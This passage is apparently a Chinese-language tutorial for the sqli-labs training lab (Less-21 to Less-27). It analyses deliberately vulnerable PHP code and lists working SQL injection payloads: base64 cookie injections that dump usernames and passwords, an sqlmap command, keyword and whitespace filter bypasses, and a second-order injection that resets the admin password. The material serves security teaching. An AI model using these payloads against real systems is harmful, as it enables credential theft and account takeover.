<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>从源码中分析可得，和 Less-20 基本上是一毛一样，只是 Coojie 这里是经过 base64 加密的，所以我们只需要传入加密后的 payload 给 cookie 的 uname 即可，下面就只用联合查询注入来简单演示一下吧：</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/Less-21/</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">127.0.0.1:8888</span></span>
<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0</span></span>
<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span>
<span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">uname=c3Fsc2VjJykgdW5pb24gc2VsZWN0IDEsMiwoU0VMRUNUIEdST1VQX0NPTkNBVCh1c2VybmFtZSxwYXNzd29yZCBTRVBBUkFUT1IgMHgzYzYyNzIzZSkgRlJPTSB1c2Vycykj</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
<span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Cookie 的 uname 参数 Base64 解码为：</p>
<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">uname&#x3D;sqlsec&#39;) union select 1,2,(SELECT GROUP_CONCAT(username,password SEPARATOR 0x3c62723e) FROM users)#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://image.3001.net/images/20200514/1589426073817.png" alt="img"></p>
<h3 id="sqlmap-3"><a href="#sqlmap-3" class="headerlink" title="sqlmap"></a>sqlmap</h3><p>手工注入问题不大，那么尝试直接使用 sqlmap 来进行联合查询注入看看：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -u <span class="token string">"http://127.0.0.1:8888/Less-21/"</span> --cookie<span class="token operator">=</span><span class="token string">"uname=*"</span> --tamper<span class="token operator">=</span><span class="token string">"base64encode"</span> --dbms<span class="token operator">=</span>MySQL --random-agent --flush-session --technique<span class="token operator">=</span>U -v <span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>sqlmap 本身不会混淆发送的 payload，混淆 payload 的话可以使用 sqlmap 自带的 payload 库</p>
<h2 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h2><table>
<thead>
<tr>
<th align="left">请求方式</th>
<th align="left">注入类型</th>
<th align="left">拼接方式</th>
</tr>
</thead>
<tbody><tr>
<td align="left">POST</td>
<td align="left">联合、报错、布尔盲注、延时盲注</td>
<td align="left"><code>username=&quot;$cookee&quot;</code></td>
</tr>
</tbody></table>
<p><strong>简单源码分析</strong>：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># 先双引号 然后直接拼接到SQL语句中</span>
<span class="token variable">$cookee1</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'"'</span><span class="token operator">.</span> <span class="token variable">$cookee</span><span class="token operator">.</span> <span class="token string single-quoted-string">'"'</span><span class="token punctuation">;</span>    
<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE username=<span class="token interpolation"><span class="token variable">$cookee1</span></span> LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>可以发现和 Less-21 相比，只是拼接方式不一样，其他都是一致的， 这里就不再啰嗦了。</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/Less-22/</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">127.0.0.1:8888</span></span>
<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0</span></span>
<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span>
<span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">uname=c3Fsc2VjIiB1bmlvbiBzZWxlY3QgMSwyLChTRUxFQ1QgR1JPVVBfQ09OQ0FUKHVzZXJuYW1lLHBhc3N3b3JkIFNFUEFSQVRPUiAweDNjNjI3MjNlKSBGUk9NIHVzZXJzKSM=</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
<span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Cookie 的 uname 参数 Base64 解码为：</p>
<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">uname&#x3D;sqlsec&quot; union select 1,2,(SELECT GROUP_CONCAT(username,password SEPARATOR 0x3c62723e) FROM users)#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h2><table>
<thead>
<tr>
<th align="left">请求方式</th>
<th align="left">注入类型</th>
<th align="left">拼接方式</th>
</tr>
</thead>
<tbody><tr>
<td align="left">GET</td>
<td align="left">联合、报错、布尔盲注、延时盲注</td>
<td align="left"><code>id=&#39;$id&#39;</code></td>
</tr>
</tbody></table>
<p><strong>简单源码分析</strong>：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># 获取到 id 的值</span>
<span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token comment"># 过滤了 id 中的 # 和 -- 然后 替换为 空</span>
<span class="token variable">$reg</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/#/"</span><span class="token punctuation">;</span>
<span class="token variable">$reg1</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/--/"</span><span class="token punctuation">;</span>
<span class="token variable">$replace</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
<span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$reg</span><span class="token punctuation">,</span> <span class="token variable">$replace</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$reg1</span><span class="token punctuation">,</span> <span class="token variable">$replace</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment"># 使用单引号拼接 SQL</span>
<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE id='<span class="token interpolation"><span class="token variable">$id</span></span>' LIMIT 0,1"</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> 有查询结果<span class="token punctuation">:</span>
    输出查询信息
<span class="token keyword">else</span><span class="token punctuation">:</span>
    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>过滤了注释符号</strong>，但是这里还可以考虑使用闭合方式来进行注入，下面直接使用最简单的联合查询注入吧：</p>
<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D;-1&#39; union select 1,(SELECT(@x)FROM(SELECT(@x:&#x3D;0x00) ,(SELECT(@x)FROM(users)WHERE(@x)IN(@x:&#x3D;CONCAT(0x20,@x,username,password,0x3c62723e))))x),3 and &#39;1&#39;&#x3D;&#39;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="Less-24"><a href="#Less-24" class="headerlink" title="Less-24"></a>Less-24</h2><p>一个经典的二次注入场景，所以下面 来单个理一下源码。</p>
<h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><ul>
<li><code>index.php</code></li>
</ul>
<p>主要记录了表单相关的信息，没有啥敏感代码，当做 Index.html 来看待就可以了，具体的界面如下：</p>
<p><img src="https://image.3001.net/images/20200515/15895151791144.png" alt="img"></p>
<p>提示输入用户名和密码，用户名和密码正确之后就可以成功登陆，否则登陆失败。</p>
<p><code>忘记密码</code>：左下角的忘记密码选项提示：如果你忘记密码 请 hack it</p>
<p><code>新建用户</code>：右下角新建用户可以新建一个自己的用户</p>
<ul>
<li><code>failed.php</code></li>
</ul>
<p>检测会话，如果 cookie 里面没有 Auth 参数的话，就跳转到 index.php</p>
<ul>
<li><code>forgot_password.php</code></li>
</ul>
<p>简单提示：如果你忘记密码 请 hack it</p>
<ul>
<li><code>Logged-in.php</code></li>
</ul>
<p>登录后的信息展示，显示登录名称并且提供了修改密码的表单</p>
<ul>
<li><code>new_user.php</code></li>
</ul>
<p>创建新用户的表单页面，本文件主要存放前段代码。</p>
<ul>
<li><code>login_create.php</code></li>
</ul>
<p>创建新用户的后端代码，下面来简单理一下代码的流程：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># 接受用户提交的用户名和密码值 并进行 mysql 安全函数转义</span>
username<span class="token operator">=</span>  <span class="token function">mysql_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>
<span class="token variable">$pass</span><span class="token operator">=</span> <span class="token function">mysql_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$re_pass</span><span class="token operator">=</span> <span class="token function">mysql_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'re_password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment"># 查询当前用户信息</span>

<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select count(*) from users where username='<span class="token interpolation"><span class="token variable">$username</span></span>'"</span><span class="token punctuation">;</span>
如果当前用户已经存在 无法注册

<span class="token keyword">if</span> 两次输入密码一致：
  <span class="token comment"># 将记录插入数据库中</span>
  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"insert into users ( username, password) values(\"<span class="token interpolation"><span class="token variable">$username</span></span>\", \"<span class="token interpolation"><span class="token variable">$pass</span></span>\")"</span><span class="token punctuation">;</span>
    查询完成后 重定向到首页
<span class="token keyword">else</span><span class="token punctuation">:</span>
    提示两次输入密码不一致<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li>`login.php</li>
</ul>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># 登录用户名和密码都被过滤了</span>
<span class="token variable">$username</span> <span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"login_user"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"login_password"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM users WHERE username='<span class="token interpolation"><span class="token variable">$username</span></span>' and password='<span class="token interpolation"><span class="token variable">$password</span></span>'"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li><code>pass_change.php</code></li>
</ul>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> 检测未登录：
    重定向到首页
<span class="token keyword">if</span> 检测到提交表单：
  <span class="token comment"># 对 pass 都进行了过滤</span>
  <span class="token variable">$username</span><span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$curr_pass</span><span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'current_password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$pass</span><span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$re_pass</span><span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'re_password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> 两次密码一致<span class="token punctuation">:</span>
        <span class="token comment"># 直接将 username 拼接到 SQL 语句</span>
        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"UPDATE users SET PASSWORD='<span class="token interpolation"><span class="token variable">$pass</span></span>' where username='<span class="token interpolation"><span class="token variable">$username</span></span>' and password='<span class="token interpolation"><span class="token variable">$curr_pass</span></span>' "</span><span class="token punctuation">;</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        提示密码不一致 并重定向到 fail<span class="token operator">.</span>php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h3><p>从代码上来看貌似都被转义了，乍一看是成功注入的。实际上的确不能使用常规的思路来进行注入，因为这题是二次注入，ISCC 2019 当时使用这题的考查点是修改掉 admin 用户的密码，然后再登录即可。假设不知道 admin 用户的情况下，想要修改掉 admin 用户的密码的话，这里就使用的是二次注入的姿势了。</p>
<p><strong>二次注入</strong> 简单概括就是黑客精心构造 SQL 语句插入到数据库中，数据库报错的信息被其他类型的 SQL 语句调用的时候触发攻击行为。因为第一次黑客插入到数据库的时候并没有触发危害性，而是再其他语句调用的时候才会触发攻击行为，这个就是二次注入。</p>
<p>先看创建用户的地方：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">username <span class="token operator">=</span>  mysql_escape_string<span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>username 被 <code>mysql_escape_string</code> 函数过滤了，该函数的作用如下：</p>
<table>
<thead>
<tr>
<th align="left">危险字符</th>
<th align="left">转义后</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>\</code></td>
<td align="left"><code>\\</code></td>
</tr>
<tr>
<td align="left"><code>&#39;</code></td>
<td align="left"><code>\&#39;</code></td>
</tr>
<tr>
<td align="left"><code>&quot;</code></td>
<td align="left"><code>\&quot;</code></td>
</tr>
</tbody></table>
<p>再看下更新密码的核心语句：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">UPDATE</span> users <span class="token keyword">SET</span> PASSWORD<span class="token operator">=</span><span class="token string">'$pass'</span> <span class="token keyword">where</span> username<span class="token operator">=</span><span class="token string">'$username'</span> <span class="token operator">and</span> password<span class="token operator">=</span><span class="token string">'$curr_pass'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>这里直接使用单引号拼接了 username 所以当 username 可控的话 ，这里是存在SQL注入的，假设用户注册的 username 的值为：<code>admin&#39;#</code>，那么此时的完整语句就为：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">UPDATE</span> users <span class="token keyword">SET</span> PASSWORD<span class="token operator">=</span><span class="token string">'$pass'</span> <span class="token keyword">where</span> username<span class="token operator">=</span><span class="token string">'admin'</span><span class="token comment"># and password='$curr_pass'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>此时就完全改变了语义，直接就修改掉了 admin 用户的密码。</p>
<h3 id="步骤演示"><a href="#步骤演示" class="headerlink" title="步骤演示"></a>步骤演示</h3><p>常见一个<code>admin&#39;#</code>开头的用户名，下面列举的几种都可以，以此类推，很灵活：</p>
<pre class="line-numbers language-none"><code class="language-none">admin&#39;#1
admin&#39;#233
admin&#39;#gg
...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>注册完成后数据库的记录信息如下：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> * from <span class="token function">users</span><span class="token punctuation">;</span>
+----+---------------+------------+
<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> username      <span class="token operator">|</span> password   <span class="token operator">|</span>
+----+---------------+------------+
<span class="token operator">|</span> <span class="token number">20</span> <span class="token operator">|</span> admin'<span class="token comment">#hacker | 111        |</span>
+----+---------------+------------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>成功添加了记录，这里单引号数据库中中看没有被虽然转义了，这是因为转义只不过是暂时的，最后存入到数据库的时候还是没变的。</p>
<p>接下来登录 <code>admin&#39;#hacker</code> 用户，然后来修改当前的密码：</p>
<p><img src="https://image.3001.net/images/20200523/15901641643476.png" alt="img"></p>
<p>此时来数据库中查看，可以发现成功修改掉了 admin 用的密码了：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> * from <span class="token function">users</span><span class="token punctuation">;</span>
+----+---------------+------------+
<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> username      <span class="token operator">|</span> password   <span class="token operator">|</span>
+----+---------------+------------+
<span class="token operator">|</span>  <span class="token number">8</span> <span class="token operator">|</span> admin         <span class="token operator">|</span> <span class="token number">233</span>        <span class="token operator">|</span>
<span class="token operator">|</span> <span class="token number">20</span> <span class="token operator">|</span> admin'<span class="token comment">#hacker | 111        |</span>
+----+---------------+------------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="Less-25"><a href="#Less-25" class="headerlink" title="Less-25"></a>Less-25</h2><table>
<thead>
<tr>
<th align="left">请求方式</th>
<th align="left">注入类型</th>
<th align="left">拼接方式</th>
</tr>
</thead>
<tbody><tr>
<td align="left">GET</td>
<td align="left">联合、报错、布尔盲注、延时盲注</td>
<td align="left"><code>id=&#39;$id&#39;</code></td>
</tr>
</tbody></table>
<p>关键代码分析：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># id 直接单引号拼接</span>
<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE id='<span class="token interpolation"><span class="token variable">$id</span></span>' LIMIT 0,1"</span><span class="token punctuation">;</span>

<span class="token comment"># 但是 id 被如下函数过滤了</span>
<span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/or/i'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    
<span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/AND/i'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">return</span> <span class="token variable">$id</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>过滤了 or 和 and 关键词，但是还存在很多方法可以绕过，下面具体演示一下：</p>
<h3 id="双写嵌套绕过"><a href="#双写嵌套绕过" class="headerlink" title="双写嵌套绕过"></a>双写嵌套绕过</h3><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D;-1&#39; union select 1,2,(SELECT+GROUP_CONCAT(username,passwoorrd+SEPARATOORR+0x3c62723e)+FROM+users)--+
password&#96; 写成了 &#96;passwoorrd&#96;，&#96;SEPARATOR&#96;写成&#96;SEPARATOORR<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>###符号替换</p>
<pre class="line-numbers language-none"><code class="language-none">or&#96; -&gt; &#96;||
and&#96; -&gt; &#96;&amp;&amp;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">?id&#x3D;1&#39;||extractvalue(1,concat(0x7e,database()))--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="Less-25a"><a href="#Less-25a" class="headerlink" title="Less-25a"></a>Less-25a</h2><table>
<thead>
<tr>
<th align="left">请求方式</th>
<th align="left">注入类型</th>
<th align="left">拼接方式</th>
</tr>
</thead>
<tbody><tr>
<td align="left">GET</td>
<td align="left">联合、布尔盲注、延时盲注</td>
<td align="left"><code>id=$id</code></td>
</tr>
</tbody></table>
<p>与 Less-25 相比，只是拼接方式改变，因为代码中没有输出报错信息，所以也无法进行报错注入，其他利用方式都是一样的， 这里不再啰嗦。</p>
<h2 id="Less-26"><a href="#Less-26" class="headerlink" title="Less-26"></a>Less-26</h2><table>
<thead>
<tr>
<th align="left">请求方式</th>
<th align="left">注入类型</th>
<th align="left">拼接方式</th>
</tr>
</thead>
<tbody><tr>
<td align="left">GET</td>
<td align="left">联合、报错、布尔盲注、延时盲注</td>
<td align="left"><code>id=&#39;$id&#39;</code></td>
</tr>
</tbody></table>
<p><strong>简单源码分析</strong>：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># 过滤了 or 和 and 大小写</span>
<span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/or/i'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">//strip out OR (non case sensitive)</span>
<span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/and/i'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//Strip out AND (non case sensitive)</span>

<span class="token comment"># 过滤了 /*</span>
<span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[\/\*]/'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//strip out /*</span>

<span class="token comment"># 过滤了 -- 和 # 注释</span>
<span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[--]/'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//Strip out --</span>
<span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[#]/'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">//Strip out #</span>

<span class="token comment"># 过滤了空格</span>
<span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[\s]/'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//Strip out spaces</span>

<span class="token comment"># 过滤了斜线</span>
<span class="token variable">$id</span><span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[\/\\\\]/'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//Strip out slashes</span>
<span class="token keyword">return</span> <span class="token variable">$id</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>过滤了 or 和 and 可以采用 双写或者 &amp;&amp; || 绕过</p>
<p>过滤注释 可以使用闭合绕过</p>
<p>过滤了空格 可以使用如下的符号来替代：</p>
<table>
<thead>
<tr>
<th align="left">符号</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">%09</td>
<td align="left">TAB 键(水平)</td>
</tr>
<tr>
<td align="left">%0a</td>
<td align="left">新建一行</td>
</tr>
<tr>
<td align="left">%0c</td>
<td align="left">新的一页</td>
</tr>
<tr>
<td align="left">%0d</td>
<td align="left">return 功能</td>
</tr>
<tr>
<td align="left">%0b</td>
<td align="left">TAB 键(垂直)</td>
</tr>
<tr>
<td align="left">%a0</td>
<td align="left">空格</td>
</tr>
</tbody></table>
<p>直接上 payload 吧：</p>
<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D;100&#39;%0bunion%0bselect%0b1,(SELECT(@x)FROM(SELECT(@x:&#x3D;0x00) ,(SELECT(@x)FROM(users)WHERE(@x)IN(@x:&#x3D;CONCAT(0x20,@x,username,passwoorrd,0x3c62723e))))x),3%0baandnd%0b&#39;1&#39;&#x3D;&#39;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="Less-26a"><a href="#Less-26a" class="headerlink" title="Less-26a"></a>Less-26a</h2><table>
<thead>
<tr>
<th align="left">请求方式</th>
<th align="left">注入类型</th>
<th align="left">拼接方式</th>
</tr>
</thead>
<tbody><tr>
<td align="left">GET</td>
<td align="left">联合、布尔盲注、延时盲注</td>
<td align="left"><code>id=(&#39;$id&#39;)</code></td>
</tr>
</tbody></table>
<p>与 Less-26 相比，只是拼接方式改变了，因为没有输出报错信息，所以不能使用报错注入了，然后不再啰嗦，大家可以自行测试。</p>
<h2 id="Less-27"><a href="#Less-27" class="headerlink" title="Less-27"></a>Less-27</h2><table>
<thead>
<tr>
<th align="left">请求方式</th>
<th align="left">注入类型</th>
<th align="left">拼接方式</th>
</tr>
</thead>
<tbody><tr>
<td align="left">GET</td>
<td align="left">联合、报错、布尔盲注、延时盲注</td>
<td align="left"><code>id=(&#39;$id&#39;)</code></td>
</tr>
</tbody></table>
<p>过滤规则又增加了许多：</p>
